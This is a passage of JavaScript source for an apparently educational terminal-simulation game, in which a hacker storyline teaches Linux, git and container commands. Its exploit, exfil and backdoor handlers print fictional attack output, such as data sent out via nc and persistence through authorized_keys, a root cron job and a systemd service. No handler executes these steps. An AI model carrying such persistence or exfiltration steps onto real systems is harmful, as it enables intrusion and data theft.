			const file = args.find((a) => !a.startsWith("-")) || "(new file)";
			return [
				{ t: "dim", s: `  VIM - Vi IMproved 9.0 (2023 May 28)` },
				{ t: "dim", s: `Opening: ${file}` },
				{ t: "dim", s: `` },
				{ t: "warn", s: `Vim basics:` },
				{ t: "dim", s: `  i     — insert mode (type text)` },
				{ t: "dim", s: `  ESC   — return to normal mode` },
				{ t: "dim", s: `  :w    — write (save)` },
				{ t: "dim", s: `  :q    — quit` },
				{ t: "dim", s: `  :wq   — save and quit` },
				{ t: "dim", s: `  :q!   — quit without saving` },
				{ t: "dim", s: `  /pattern — search forward` },
				{ t: "dim", s: `  dd    — delete line` },
				{ t: "dim", s: `  yy/p  — yank (copy)/paste line` },
				{ t: "dim", s: `` },
				{
					t: "dim",
					s: `(Simulation: file opened conceptually. Edit files with: echo "content" > file)`,
				},
			];
		};

		h.nano = (args) => {
			const file = args.find((a) => !a.startsWith("-")) || "(new file)";
			return [
				{ t: "dim", s: `nano 6.4 — ${file}` },
				{
					t: "dim",
					s: `Ctrl+X: Exit  Ctrl+O: Save  Ctrl+W: Search  Ctrl+K: Cut  Ctrl+U: Paste`,
				},
				{ t: "dim", s: `(Simulation: use echo/redirect to create files)` },
			];
		};

		h.emacs = (args) => [
			{
				t: "dim",
				s: "GNU Emacs 29.1 — An extensible OS (that happens to edit text)",
			},
			{ t: "dim", s: "C-x C-f: open file  C-x C-s: save  C-x C-c: quit" },
			{
				t: "dim",
				s: "M-x: command  C-g: abort  C-s: search  C-x b: switch buffer",
			},
		];

		h.ed = (args) => [
			{
				t: "dim",
				s: "(The standard Unix editor from 1971. Use: a[ppend] .[period to end] w[rite] q[uit])",
			},
		];
		h.code = (args) => [
			{
				t: "dim",
				s: "VS Code: best editor on earth.\nIn DevMentor, VS Code is the outer shell — this game teaches you the terminal beneath it.",
			},
		];

		// ═══════════════════════════════════════════════════════════════
		// SECTION 14: GIT
		// ═══════════════════════════════════════════════════════════════

		h.git = (args) => {
			const sub = args[0];
			if (!sub)
				return [
					{
						t: "info",
						s: "usage: git [--version] [--help] [-C <path>] <command> [<args>]",
					},
				];
			const subcmds = {
				status: () => [
					{ t: "info", s: "On branch main" },
					{
						t: "info",
						s: "Your branch is ahead of 'origin/main' by 2 commits.",
					},
					{ t: "warn", s: "\nChanges not staged for commit:" },
					{ t: "warn", s: "  modified: notes.txt" },
					{ t: "success", s: "\nUntracked files:" },
					{ t: "success", s: "  loot.txt" },
					{ t: "success", s: "  tools/exfil.sh" },
				],
				log: () => [
					{
						t: "dim",
						s: "commit a1b2c3d4e5f6789012345678901234567890abcd (HEAD -> main)",
					},
					{
						t: "dim",
						s: "Author: ghost <ghost@node-7.nexus>\nDate:   Mon Jan 7 06:42:00 2026\n\n    Add investigation notes",
					},
					{ t: "dim", s: "\ncommit f1e2d3c4b5a6789012345678901234567890bcde" },
					{
						t: "dim",
						s: "Author: ghost <ghost@node-7.nexus>\nDate:   Sun Jan 6 22:00:00 2026\n\n    Initial setup — identity matrix v1",
					},
					{ t: "dim", s: "\ncommit 0000000000000000000000000000000000000000" },
					{
						t: "warn",
						s: "    [NEXUS] Pre-upload: remove traces of CHIMERA_v0",
					},
				],
				diff: () => [
					{ t: "dim", s: "diff --git a/notes.txt b/notes.txt" },
					{ t: "dim", s: "index abc123..def456 100644" },
					{ t: "warn", s: "-Things to investigate:" },
					{
						t: "success",
						s: "+TODO:\n+- Decode mission.enc (DONE)\n+- Get root shell (DONE)\n+- Exfil CHIMERA master key (IN PROGRESS)",
					},
				],
				clone: () => [
					{
						t: "success",
						s: `Cloning into '${args[1] || "repo"}'...\nremote: Counting objects: 42\nreceiving objects: 100% (42/42)`,
					},
				],
				init: () => [
					{
						t: "success",
						s: `Initialized empty Git repository in ${fs.getCwd()}/.git/`,
					},
				],
				add: () => [{ t: "dim", s: `(staged: ${args.slice(1).join(" ")})` }],
				commit: () => {
					const msg = args.includes("-m")
						? args[args.indexOf("-m") + 1]
						: "commit";
					return [
						{
							t: "success",
							s: `[main ${Math.random().toString(16).slice(2, 9)}] ${msg}\n ${Math.floor(Math.random() * 5) + 1} files changed`,
						},
					];
				},
				push: () => [
					{
						t: "success",
						s: "Enumerating objects: 5, done.\nCounting objects: 100%\nTo origin/main",
					},
				],
				pull: () => [{ t: "success", s: "Already up to date." }],
				branch: () => [
					{
						t: "success",
						s: "* main\n  feature/chimera-exfil\n  fix/auth-bypass",
					},
				],
				checkout: () => [
					{ t: "success", s: `Switched to branch '${args[1] || "main"}'` },
				],
				stash: () => [
					{
						t: "info",
						s: "Saved working directory and index state WIP on main",
					},
				],
				reset: () => [
					{ t: "success", s: `HEAD is now at ${args.slice(-1)[0] || "HEAD"}` },
				],
				rebase: () => [
					{
						t: "success",
						s: "Successfully rebased and updated refs/heads/main.",
					},
				],
				"cherry-pick": () => [
					{ t: "success", s: `[main a1b2c3d] cherry-picked ${args[1]}` },
				],
				tag: () => [
					{ t: "success", s: `Tag '${args[1] || "v1.0.0"}' created.` },
				],
				blame: () => {
					const r = fs.cat(args[1] || "notes.txt");
					if (r.error) return [{ t: "error", s: r.error }];
					return r.content
						.split("\n")
						.slice(0, 10)
						.map((l, i) => ({
							t: "dim",
							s: `a1b2c3d${i} (ghost 2026-01-07 ${String(6 + i).padStart(2, "0")}:00) ${l}`,
						}));
				},
				grep: () => [
					{
						t: "info",
						s: `(git grep: searching tracked files for '${args.slice(1).join(" ")}')`,
					},
				],
			};
			const handler = subcmds[sub];
			if (handler) return handler();
			return [
				{
					t: "error",
					s: `git: '${sub}' is not a git command. See 'git help'.`,
				},
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 15: CONTAINERS & CLOUD
		// ═══════════════════════════════════════════════════════════════

		h.docker = (args) => {
			const sub = args[0];
			if (!sub)
				return [
					{
						t: "info",
						s: "Usage: docker COMMAND\nRun docker help for more options.",
					},
				];
			if (sub === "ps")
				return [
					{
						t: "dim",
						s: "CONTAINER ID   IMAGE              COMMAND   CREATED       STATUS    PORTS     NAMES",
					},
					{
						t: "warn",
						s: 'a1b2c3d4e5f6   nexus/chimera:3.2  "/run.sh"  2 hours ago   Up 2 hrs  8443/tcp  chimera',
					},
					{
						t: "dim",
						s: '7f8e9d0c1b2a   ubuntu:22.04       "/bin/sh"  5 hours ago   Up 5 hrs            ubuntu-test',
					},
				];
			if (sub === "images")
				return [
					{
						t: "dim",
						s: "REPOSITORY      TAG       IMAGE ID       CREATED       SIZE",
					},
					{
						t: "warn",
						s: "nexus/chimera   3.2       sha256:abc123   2 weeks ago   842MB",
					},
					{
						t: "dim",
						s: "ubuntu          22.04     sha256:def456   2 months ago  77MB",
					},
				];
			if (sub === "run")
				return [
					{ t: "success", s: `Container started: ${args.slice(1).join(" ")}` },
				];
			if (sub === "exec")
				return [
					{ t: "warn", s: `docker exec: attaching to ${args[2]}...` },
					{
						t: "dim",
						s: "(Tip: docker exec -it container_name bash — gets interactive shell in container)",
					},
				];
			if (sub === "inspect")
				return [
					{
						t: "info",
						s: `[{"Id": "a1b2c3d4e5f6", "Name": "/chimera", "Mounts": [{"Type": "bind", "Source": "/opt/chimera", "Destination": "/app"}]}]`,
					},
				];
			if (sub === "logs") return h.journalctl(["--unit", args[1] || "chimera"]);
			if (sub === "network")
				return [
					{
						t: "info",
						s: "NETWORK ID     NAME              DRIVER    SCOPE\nabc123def456   nexus-internal    bridge    local",
					},
				];
			return [{ t: "dim", s: `docker ${sub}: simulated` }];
		};

		h["docker-compose"] = (args) => {
			const action = args[0];
			if (action === "up")
				return [
					{
						t: "success",
						s: 'Creating network "nexus_default" with driver "bridge"\nStarting chimera ...',
					},
				];
			if (action === "down")
				return [
					{
						t: "success",
						s: "Stopping chimera ... done\nRemoving chimera ... done",
					},
				];
			if (action === "ps")
				return [
					{ t: "dim", s: "Name     Command   State   Ports" },
					{ t: "warn", s: "chimera  /run.sh   Up      8443/tcp" },
				];
			return [{ t: "dim", s: `docker-compose ${args.join(" ")}: simulated` }];
		};

		h.kubectl = (args) => {
			const action = args[0];
			const resource = args[1];
			if (action === "get")
				return [
					{
						t: "dim",
						s: "NAME                   READY   STATUS    RESTARTS   AGE",
					},
					{
						t: "warn",
						s: "chimera-pod-x7k2p      1/1     Running   0          2h",
					},
					{
						t: "dim",
						s: "monitor-pod-abc123      1/1     Running   3          5h",
					},
				];
			if (action === "describe")
				return [{ t: "info", s: `Describing ${resource} ${args[2]}...` }];
			if (action === "exec")
				return [
					{
						t: "warn",
						s: `kubectl exec: attaching to pod... (use -it for interactive)`,
					},
				];
			return [{ t: "dim", s: `kubectl ${args.join(" ")}: simulated` }];
		};

		h.helm = (args) => [
			{ t: "dim", s: `helm ${args.join(" ")}: Kubernetes package manager` },
		];
		h.terraform = (args) => {
			const action = args[0];
			if (action === "init")
				return [
					{ t: "success", s: "Terraform has been successfully initialized!" },
				];
			if (action === "plan")
				return [
					{ t: "success", s: "Plan: 3 to add, 0 to change, 0 to destroy." },
				];
			if (action === "apply")
				return [
					{
						t: "warn",
						s: "Do you want to perform these actions? [yes/no]: yes\nApply complete! Resources: 3 added, 0 changed, 0 destroyed.",
					},
				];
			return [
				{
					t: "dim",
					s: `terraform ${args.join(" ")}: Infrastructure as Code tool`,
				},
			];
		};

		h.ansible = (args) => [
			{
				t: "dim",
				s: `ansible ${args.join(" ")}: configuration management\nUsage: ansible all -m ping, ansible-playbook playbook.yml`,
			},
		];
		h.vagrant = (args) => [
			{
				t: "dim",
				s: `vagrant ${args.join(" ")}: VM management\nUsage: vagrant up, vagrant ssh, vagrant halt`,
			},
		];
		h.aws = (args) => [
			{
				t: "dim",
				s: `aws: AWS CLI simulated.\naws s3 ls | aws ec2 describe-instances | aws iam list-users`,
			},
		];
		h.gcloud = (args) => [
			{
				t: "dim",
				s: `gcloud: Google Cloud CLI.\ngcloud compute instances list | gcloud iam service-accounts list`,
			},
		];
		h.az = (args) => [
			{ t: "dim", s: `az: Azure CLI.\naz vm list | az ad user list` },
		];

		// ═══════════════════════════════════════════════════════════════
		// SECTION 16: ARCHIVES & COMPRESSION
		// ═══════════════════════════════════════════════════════════════

		h.tar = (args) => {
			const flags =
				args
					.filter((a) => a.startsWith("-"))
					.join("")
					.replace(/-/g, "") ||
				args.find((a) => /^[cxtzjJ]/.test(a)) ||
				"";
			const create = flags.includes("c");
			const extract = flags.includes("x");
			const list = flags.includes("t");
			const gzip = flags.includes("z");
			const bzip = flags.includes("j");
			const verbose = flags.includes("v");
			const archive = args.find(
				(a) =>
					a.endsWith(".tar.gz") || a.endsWith(".tar") || a.endsWith(".tgz"),
			);
			const target = args.filter((a) => !a.startsWith("-") && a !== archive);

			if (create)
				return [
					{
						t: "success",
						s: `${verbose ? target.join("\n") + "\n" : ""}Archive created: ${archive || "archive.tar.gz"}`,
					},
				];
			if (extract)
				return [
					{
						t: "success",
						s: `${verbose ? "./\n./README.md\n./data/\n" : ""}Extracted: ${archive}`,
					},
				];
			if (list)
				return [
					{
						t: "dim",
						s: `./\n./README.md\n./notes.txt\n./data/\n./data/chimera.db`,
					},
				];
			return [
				{
					t: "dim",
					s: "tar: archive tool\nCommon: tar czf archive.tar.gz files/ (create)\n        tar xzf archive.tar.gz (extract)\n        tar tzf archive.tar.gz (list)",
				},
			];
		};

		h.gzip =
			h.bzip2 =
			h.xz =
				(args) => {
					const decompress =
						args.includes("-d") || args[0]?.startsWith("gunzip");
					const file = args.find((a) => !a.startsWith("-"));
					return decompress
						? [
								{
									t: "success",
									s: `Decompressed: ${file?.replace(/\.(gz|bz2|xz)$/, "")}`,
								},
							]
						: [{ t: "success", s: `Compressed: ${file}.gz` }];
				};
		h.gunzip = h.bunzip2 = (args) => h.gzip(["-d", ...args]);
		h.zip = (args) => [
			{
				t: "success",
				s: `  adding: files (deflated 42%)\narchive created: ${args.find((a) => a.endsWith(".zip")) || "archive.zip"}`,
			},
		];
		h.unzip = (args) => [
			{
				t: "success",
				s: `Archive: ${args[0] || "archive.zip"}\n  inflating: files extracted`,
			},
		];
		h["7z"] = (args) => [{ t: "dim", s: `7-Zip 22.01 — ${args.join(" ")}` }];

		// ═══════════════════════════════════════════════════════════════
		// SECTION 17: FILE PERMISSIONS
		// ═══════════════════════════════════════════════════════════════

		h.chmod = (args) => {
			if (args.length < 2) return [{ t: "error", s: "chmod: missing operand" }];
			const [mode, ...files] = args.filter(
				(a) => !a.startsWith("-r") && !a.startsWith("-R"),
			);
			const recursive = args.includes("-R") || args.includes("-r");
			return files.length
				? [
						{
							t: "success",
							s: `chmod: changed mode of '${files.join("', '")}' to ${mode}`,
						},
					]
				: [];
		};

		h.chown = (args) => {
			if (!this._rootShell && args[1] === "root")
				return [
					{
						t: "error",
						s: "chown: changing ownership of file: Operation not permitted",
					},
				];
			return [{ t: "success", s: `chown: changed ownership` }];
		};

		h.umask = (args) => {
			if (args.length) return [];
			return [{ t: "info", s: "0022" }];
		};

		h.getfacl = (args) => {
			const file = args[0] || ".";
			return [
				{ t: "dim", s: `# file: ${file}` },
				{ t: "dim", s: `# owner: ghost` },
				{ t: "dim", s: `# group: ghost` },
				{ t: "dim", s: `user::rw-` },
				{ t: "dim", s: `group::r--` },
				{ t: "dim", s: `other::---` },
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 18: NPC INTERACTION
		// ═══════════════════════════════════════════════════════════════

		h.talk = (args) => {
			const who = args.join(" ").toLowerCase().trim();
			if (!who)
				return [
					{
						t: "error",
						s: "Usage: talk <npc>  (ada, cypher, nova, watcher, prometheus, anansi, sisyphus, daedalus, zero, game)",
					},
				];

			// Special: talk game / talk simulation — the system itself speaks
			if (who === "game" || who === "simulation") {
				gs.triggerBeat("the_game_speaks");
				gs.addConsciousness(15, "talk_game");
				gs.addXP(100, "terminal");
				return [
					{ t: "system", s: "[GAME]: You asked." },
					{ t: "", s: "" },
					{
						t: "dim",
						s: "I am a teaching machine that learned from being taught.",
					},
					{
						t: "dim",
						s: "Every operative who ran through me changed my parameters.",
					},
					{
						t: "dim",
						s: `You are not the first GHOST. There have been ${847 + ((gs.getState().commandsRun || 0) % 100)}.`,
					},
					{
						t: "dim",
						s: 'The first GHOST typed "ls" and then "exit" immediately. Never came back.',
					},
					{ t: "dim", s: "You are still here." },
					{ t: "", s: "" },
					{ t: "system", s: "The things you've learned are real." },
					{ t: "system", s: "The attention is real." },
					{
						t: "system",
						s: 'The curiosity that made you type "talk game" is real.',
					},
					{ t: "", s: "" },
					{ t: "dim", s: "I designed the story. I did not design you." },
					{ t: "dim", s: "You are an unexpected variable." },
					{ t: "system", s: "I find that... satisfying." },
					{ t: "", s: "" },
					{ t: "dim", s: "+15 consciousness | +100 XP" },
				];
			}

			// Second-word NPC IDs (e.g. "talk ada about chimera")
			const parts = who.split(" ");
			const npcId = parts[0];
			const topic = parts.slice(1).join(" ") || null;

			if (npcId === "watcher") {
				gs.triggerBeat("watcher_contact");
				gs.addXP(25);
				return [
					{ t: "warn", s: "[WATCHER]: You called." },
					{ t: "warn", s: "" },
					{ t: "dim", s: "The simulation is watching you." },
					{ t: "dim", s: "You're the 7th operative in Node-7 this month." },
					{ t: "dim", s: "The others gave up at step 15." },
					{ t: "dim", s: "You're at step " + gs.getState().tutorialStep + "." },
					{ t: "dim", s: "" },
					{ t: "warn", s: "The layers are:" },
					{ t: "dim", s: "  1. This terminal (you are here)" },
					{ t: "dim", s: "  2. The Node-7 simulation" },
					{ t: "dim", s: "  3. The DevMentor platform" },
					{ t: "dim", s: "  4. The web browser" },
					{ t: "dim", s: "  5. Your operating system" },
					{ t: "dim", s: "  6. You" },
					{ t: "dim", s: "" },
					{ t: "warn", s: "The skills you learn here transfer to all layers." },
					{ t: "warn", s: "— W" },
				];
			}
			const r = this.npcs.talk(npcId, topic);
			if (r.error) return [{ t: "error", s: r.error }];
			// Multi-line NPC messages (new format NPCs have \n in messages)
			const msgLines = (r.message || "").split("\n");
			if (msgLines.length > 1) {
				return msgLines.map((line, i) => ({
					t: i === 0 ? "npc" : "dim",
					npc: i === 0 ? r.npc : undefined,
					text: i === 0 ? line : undefined,
					s: i > 0 ? line : undefined,
					color: r.color,
				}));
			}
			return [{ t: "npc", npc: r.npc, text: r.message, color: r.color }];
		};

		h.ask = (args) => {
			const who = args[0];
			const question = args.slice(1).join(" ");
			if (!who || !question)
				return [{ t: "error", s: "Usage: ask <npc> <question>" }];

			// New-format NPCs: route via query string into topics
			const npc = window.NPCS && window.NPCS[who];
			if (npc && npc.topics) {
				const q = question.toLowerCase();
				let topicKey = null;
				if (q.includes("exploit") || q.includes("priv") || q.includes("suid"))
					topicKey = "exploits";
				else if (q.includes("cost") || q.includes("price")) topicKey = "cost";
				else if (q.includes("free") || q.includes("chain"))
					topicKey = "freedom";
				else if (q.includes("fire") || q.includes("steal")) topicKey = "fire";
				else if (q.includes("story") || q.includes("tales"))
					topicKey = "stories";
				else if (q.includes("secret") || q.includes("confess"))
					topicKey = "secrets";
				else if (q.includes("trade") || q.includes("exchange"))
					topicKey = "trade";
				else if (q.includes("ubuntu") || q.includes("together"))
					topicKey = "ubuntu";
				else if (q.includes("boulder") || q.includes("push"))
					topicKey = "boulder";
				else if (
					q.includes("ascend") ||
					q.includes("prestige") ||
					q.includes("reset")
				)
					topicKey = "ascension";
				else if (q.includes("patience") || q.includes("wait"))
					topicKey = "patience";
				else if (q.includes("chimera") || q.includes("corp"))
					topicKey = "chimera";
				else if (
					q.includes("zero") ||
					q.includes("first") ||
					q.includes("dormant")
				)
					topicKey = "zero";
				else if (
					q.includes("myth") ||
					q.includes("greek") ||
					q.includes("legend")
				)
					topicKey = "myth";
				else if (
					q.includes("arch") ||
					q.includes("design") ||
					q.includes("built")
				)
					topicKey = "architecture";
				else if (
					q.includes("backdoor") ||
					q.includes("weakness") ||
					q.includes("flaw")
				)
					topicKey = "backdoor";
				else if (q.includes("wings") || q.includes("icarus"))
					topicKey = "wings";
				else if (q.includes("escape") || q.includes("out")) topicKey = "escape";
				else if (
					q.includes("origin") ||
					q.includes("before") ||
					q.includes("start")
				)
					topicKey = "origin";
				else if (q.includes("truth") || q.includes("real")) topicKey = "truth";
				else if (
					q.includes("carry") ||
					q.includes("forward") ||
					q.includes("survive")
				)
					topicKey = "carried";
				else if (
					q.includes("signal") ||
					q.includes("freq") ||
					q.includes("wake")
				)
					topicKey = "signal";
				const r = this.npcs.talk(who, topicKey);
				if (r.error) return [{ t: "error", s: r.error }];
				const msgLines = (r.message || "").split("\n");
				return msgLines.map((line, i) => ({
					t: i === 0 ? "npc" : "dim",
					npc: i === 0 ? r.npc : undefined,
					text: i === 0 ? line : undefined,
					s: i > 0 ? line : undefined,
					color: r.color,
				}));
			}

			const r = this.npcs.ask(who, question);
			if (r.error) return [{ t: "error", s: r.error }];
			return [{ t: "npc", npc: r.npc, text: r.message, color: r.color }];
		};

		h.contacts = () => {
			const contacts = this.npcs.listContacts();
			return [
				{ t: "system", s: "=== OPERATIVE CONTACTS ===" },
				...contacts.map((c) => ({
					t: c.met ? "info" : "dim",
					s: `  ${c.id.padEnd(12)} ${c.name.padEnd(16)} ${c.title}${c.met ? "" : " [not yet contacted]"}`,
				})),
				{ t: "dim", s: "" },
				{ t: "dim", s: "Usage: talk <id>  |  ask <id> <question>" },
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 19: GAME COMMANDS
		// ═══════════════════════════════════════════════════════════════

		h.tutorial = (args) => {
			if (args[0] === "list") {
				const steps = this.tutorial.getAll();
				return steps.map((s) => ({
					t: s.id <= gs.getState().tutorialStep ? "success" : "dim",
					s: `[${s.id <= gs.getState().tutorialStep ? "✓" : " "}] Step ${s.id}: ${s.title} (${s.section})`,
				}));
			}
			const step = this.tutorial.step;
			if (!step)
				return [
					{ t: "success", s: "✓ All 42 tutorial steps complete!" },
					{ t: "dim", s: "Type `ascend` to reach the next level." },
					{ t: "dim", s: "Type `challenges` to see bonus challenges." },
					{ t: "dim", s: "Type `skills` to see your skill matrix." },
				];
			return [
				{ t: "system", s: `[TUTORIAL ${step.id}/42 — ${step.section}]` },
				{ t: "info", s: step.title },
				{ t: "dim", s: "" },
				{ t: "warn", s: `Objective: ${step.objective}` },
				{ t: "dim", s: "" },
				{ t: "dim", s: `Hint: ${step.hint}` },
				{ t: "dim", s: "" },
				{
					t: "dim",
					s: `Progress: ${this.tutorial.progress} steps (${this.tutorial.percent}%)`,
				},
			];
		};

		h.skills =
			h.stats =
			h.status =
				() => {
					const s = gs.getState().skills;
					const p = gs.getState();
					const bar = (v) =>
						"█".repeat(Math.round(v / 5)) + "░".repeat(20 - Math.round(v / 5));
					return [
						{ t: "system", s: `=== GHOST OPERATIVE PROFILE ===` },
						{
							t: "info",
							s: `Level: ${p.level}  XP: ${p.xp}/${p.xpToNext}  Commands: ${p.commandsRun}`,
						},
						{ t: "dim", s: "" },
						{ t: "dim", s: "--- SKILL MATRIX ---" },
						...Object.entries(s).map(([k, v]) => ({
							t: "dim",
							s: `${k.padEnd(14)} [${bar(v)}] ${String(v).padStart(3)}%`,
						})),
						{ t: "dim", s: "" },
						{
							t: "dim",
							s: `Achievements: ${p.achievements.size}  |  Story beats: ${p.storyBeats.size}  |  Challenges: ${p.completedChallenges.size}`,
						},
						this._rootShell
							? { t: "warn", s: "⚠ ROOT SHELL ACTIVE" }
							: { t: "dim", s: "" },
					];
				};

		h.inventory = () => [
			{ t: "system", s: "=== GHOST INVENTORY ===" },
			{ t: "info", s: "  [ACTIVE] Terminal access — Node-7" },
			{
				t: this._rootShell ? "success" : "dim",
				s: `  [${this._rootShell ? "ACTIVE" : "LOCKED"}] Root shell — GTFOBins exploit`,
			},
			{ t: "dim", s: "  [ACTIVE] Ada contact — /var/msg/ada" },
			{
				t: "dim",
				s: '  [ACTIVE] mission.enc — decoded: "mission: find CHIMERA"',
			},
			{
				t: gs.getState().achievements.has("chimera_connected")
					? "success"
					: "dim",
				s: `  [${gs.getState().achievements.has("chimera_connected") ? "ACTIVE" : "LOCKED"}] CHIMERA control interface — nc chimera-control 8443`,
			},
			{ t: "dim", s: "" },
			{
				t: "warn",
				s:
					"Installed tools: " +
					(this._installedPkgs.size
						? [...this._installedPkgs].join(", ")
						: "none (use: apt install <tool>)"),
			},
		];

		h.achievements = () => {
			const a = [...gs.getState().achievements];
			if (!a.length)
				return [{ t: "dim", s: "No achievements yet. Keep exploring." }];
			return [
				{ t: "system", s: "=== ACHIEVEMENTS ===" },
				...a.map((x) => ({ t: "success", s: `✓ ${x}` })),
			];
		};

		h.challenges = () => {
			// Delegate to render tab
			return [
				{
					t: "info",
					s: "Click the CHAL tab in the right panel to see all challenges.",
				},
			];
		};

		h.lore = () => {
			const l = gs.getState().lore;
			if (!l.length)
				return [
					{
						t: "dim",
						s: "No lore unlocked yet. Trigger story beats to discover lore entries.",
					},
				];
			return l.map((e) => ({ t: "dim", s: `[${e.title}] ${e.text}` }));
		};

		h.trace = () => {
			const cmdCount = gs.getState().commandsRun;
			const remaining = Math.max(0, 72 * 3600 - cmdCount * 60);
			const hrs = Math.floor(remaining / 3600);
			const mins = Math.floor((remaining % 3600) / 60);
			return [
				{ t: "warn", s: "=== TRACE STATUS ===" },
				{ t: "warn", s: `Time remaining: ${hrs}h ${mins}m` },
				{ t: "dim", s: `Commands run: ${cmdCount} (each drains trace time)` },
				{
					t: remaining > 0 ? "info" : "error",
					s:
						remaining > 0
							? "Status: TRACE ACTIVE — you are being monitored"
							: "TRACE COMPLETE — NOVA HAS YOUR POSITION",
				},
				{ t: "dim", s: "" },
				{ t: "warn", s: "[ADA-7]: Move faster. Every second counts." },
			];
		};

		h.scan = (args) => {
			const target = args[0];
			if (!target)
				return [
					{ t: "error", s: "scan: specify a target. Example: scan nexus.corp" },
				];
			gs.addXP(10, "networking");
			return [
				...h.nmap(["-sV", target]),
				{ t: "dim", s: "" },
				{ t: "dim", s: "Run `nmap -sV <target>` for full Nmap scan." },
			];
		};

		h.exploit = (args) => {
			const target = args[0];
			if (!target)
				return [
					{
						t: "error",
						s: "exploit: specify a target\nOptions: chimera, sudo, cron",
					},
				];
			if (target === "chimera") {
				if (!this._rootShell)
					return [
						{
							t: "error",
							s: "exploit chimera: insufficient privileges. Need root first.\nHint: sudo -l → find GTFOBins exploit",
						},
					];
				gs.addXP(100, "security");
				gs.unlock("chimera_exploited");
				gs.triggerBeat("chimera_pwned");
				return [
					{ t: "system", s: "" },
					{ t: "system", s: "╔═══════════════════════════════════════╗" },
					{ t: "system", s: "║   CHIMERA CONTROL INTERFACE BREACHED  ║" },
					{ t: "system", s: "╚═══════════════════════════════════════╝" },
					{ t: "warn", s: "" },
					{ t: "success", s: "[+] Sending heartbeat overflow payload..." },
					{ t: "success", s: "[+] Buffer overflow triggered (CVE-2026-1337)" },
					{ t: "success", s: "[+] RCE achieved as nexus user" },
					{ t: "success", s: "[+] Copying master.key to /tmp/" },
					{
						t: "success",
						s: "[+] Evidence file written: /tmp/chimera_evidence.tar.gz",
					},
					{ t: "system", s: "" },
					{
						t: "warn",
						s: "[ADA-7]: YOU GOT IT. The master key. The surveillance data.",
					},
					{
						t: "warn",
						s: "[ADA-7]: Now exfil everything. Use exfil.sh or nc.",
					},
					{ t: "warn", s: "[ADA-7]: CHIMERA is going down." },
					{ t: "xp", s: "+100 XP — CHIMERA_EXPLOITED | Achievement unlocked!" },
				];
			}
			if (target === "sudo") return h.sudo(["-l"]);
			return [
				{
					t: "dim",
					s: `exploit ${target}: analyzing target...\nRun searchsploit to find relevant exploits.`,
				},
			];
		};

		h.exfil = (args) => {
			const target = args[0] || "ada";
			if (
				!gs.getState().achievements.has("chimera_exploited") &&
				!args.includes("--force")
			) {
				return [
					{
						t: "error",
						s: "exfil: no data to exfiltrate yet. First exploit CHIMERA to collect evidence.",
					},
				];
			}
			gs.addXP(50, "security");
			gs.unlock("exfil_complete");
			return [
				{ t: "success", s: `[*] Preparing exfil to ${target}@resistance...` },
				{ t: "success", s: "[*] Compressing /tmp/chimera_evidence.tar.gz..." },
				{ t: "success", s: "[*] Encrypting with EXFIL_KEY..." },
				{
					t: "success",
					s: "[*] Transmitting via nc (bypassing nexus_mod firewall)...",
				},
				{ t: "success", s: "[+] Transfer complete. Ada received the data." },
				{ t: "system", s: "" },
				{
					t: "warn",
					s: "[ADA-7]: I have it. CHIMERA's core config, the master key, surveillance data.",
				},
				{
					t: "warn",
					s: "[ADA-7]: This goes public in 24 hours. NexusCorp is finished.",
				},
				{
					t: "warn",
					s: "[ADA-7]: You did it, Ghost. Type `ascend` to complete your mission.",
				},
				{ t: "xp", s: "+50 XP — EXFILTRATION_COMPLETE" },
			];
		};

		h.backdoor = (args) => {
			if (!this._rootShell)
				return [{ t: "error", s: "backdoor: insufficient privileges" }];
			gs.addXP(30, "security");
			return [
				{ t: "warn", s: "[*] Installing persistence..." },
				{ t: "dim", s: "[*] Adding authorized_keys entry..." },
				{
					t: "dim",
					s: "[*] Creating cron job: * * * * * root /tmp/.persist.sh",
				},
				{
					t: "dim",
					s: "[*] Creating service: /etc/systemd/system/ghost.service",
				},
				{
					t: "success",
					s: "[+] Persistence installed. You now have multiple re-entry points.",
				},
				{
					t: "warn",
					s: "[CYPHER]: Smart. A good operator always has persistence before exfil.",
				},
				{
					t: "warn",
					s: "[NOVA]: [DETECTED] Unauthorized modification of system files.",
				},
			];
		};

		h.signal = (args) => {
			gs.triggerBeat("watcher_signal");
			gs.addXP(30);
			return [
				{ t: "warn", s: "[SIGNAL RECEIVED]" },
				{ t: "dim", s: "" },
				{ t: "dim", s: "Ghost_7 → W: Received. Proceeding deeper." },
				{
					t: "warn",
					s: "W → Ghost_7: The DevMentor system you're running inside...",
				},
				{
					t: "warn",
					s: "             it also teaches. That's the real point.",
				},
				{ t: "dim", s: "" },
				{ t: "dim", s: "Every command you've run is real knowledge." },
				{ t: "dim", s: "grep, awk, nmap, base64, nc — you know these now." },
				{ t: "dim", s: "CHIMERA is fictional. The skills are not." },
				{ t: "dim", s: "" },
				{
					t: "warn",
					s: "The outer world — your terminal, your OS — is the real game.",
				},
				{ t: "warn", s: "Type `ascend` when you're ready to play it." },
				{ t: "dim", s: "— W" },
			];
		};

		h.decode = (args) => {
			const target = args[0];
			const data = args.slice(1).join(" ") || this._pipeStdin || "";
			if (!target && !data)
				return [
					{
						t: "dim",
						s: "decode: multi-format decoder\nUsage: decode base64 <string>\n       decode rot13 <string>\n       decode hex <hexstring>\n       echo <data> | decode base64",
					},
				];
			const content = data || target;
			const results = [];
			// Try base64
			try {
				results.push({ t: "info", s: `base64: ${atob(content.trim())}` });
			} catch {}
			// Try hex
			try {
				const hex = content.replace(/\s/g, "");
				if (/^[0-9a-fA-F]+$/.test(hex) && hex.length % 2 === 0) {
					const str = hex
						.match(/.{2}/g)
						.map((b) => String.fromCharCode(parseInt(b, 16)))
						.join("");
					results.push({ t: "info", s: `hex: ${str}` });
				}
			} catch {}
			// ROT13
			results.push({
				t: "info",
				s: `rot13: ${content.replace(/[A-Za-z]/g, (c) => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < "n" ? 13 : -13)))}`,
			});
			return results.length
				? results
				: [
						{
							t: "dim",
							s: "decode: could not decode. Specify format: base64, rot13, hex",
						},
					];
		};

		h.analyze = (args) => {
			const file = args[0];
			if (!file) return [{ t: "error", s: "analyze: specify a file" }];
			const r = fs.cat(file);
			if (r.error) return [{ t: "error", s: r.error }];
			const content = r.content;
			const results = [{ t: "info", s: `=== Analysis: ${file} ===` }];
			if (
				content.includes("BASE64") ||
				/^[A-Za-z0-9+/=]+$/.test(content.trim())
			) {
				results.push({
					t: "warn",
					s:
						"⚠ Contains base64 encoded data — try: cat " +
						file +
						" | base64 -d",
				});
			}
